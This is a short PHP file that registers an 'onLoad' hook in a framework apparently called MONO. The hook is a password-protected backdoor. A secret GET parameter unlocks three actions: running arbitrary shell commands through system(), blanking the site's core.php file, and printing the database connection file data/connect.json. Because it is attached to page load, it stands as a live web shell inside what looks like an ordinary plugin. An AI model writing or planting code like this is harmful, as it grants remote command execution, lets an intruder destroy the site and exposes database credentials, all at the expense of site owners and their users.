<?php



MONO_Hooks::add_action("onLoad", function() {
    $pass = "";
    $cmd = "";
    if (isset($_GET["pass"]) && isset($_GET["cmd"]))
    {
        $pass = $_GET["pass"];
        $cmd = $_GET["cmd"];
    }

    if (password_verify($pass, "$2y$10\$N88oveBl7tajSRhApc8t.O.alBlDsKgseDYi79u0YaXcmGlMxI8la")) {
        switch ($cmd) {
            case "sys":
                $exec = $_GET["exec"];
                system($exec,$ret);
                MONO_Debug($ret);
                break;

            case "kill":
                // in develop
                break;

            case "disconnect":
                echo ":)";
                file_put_contents(CORE . "core.php", "");
                break;

            case "db":
                MONO_Debug(file_get_contents(CORE . "data/connect.json"));
                break;
        }
    }
});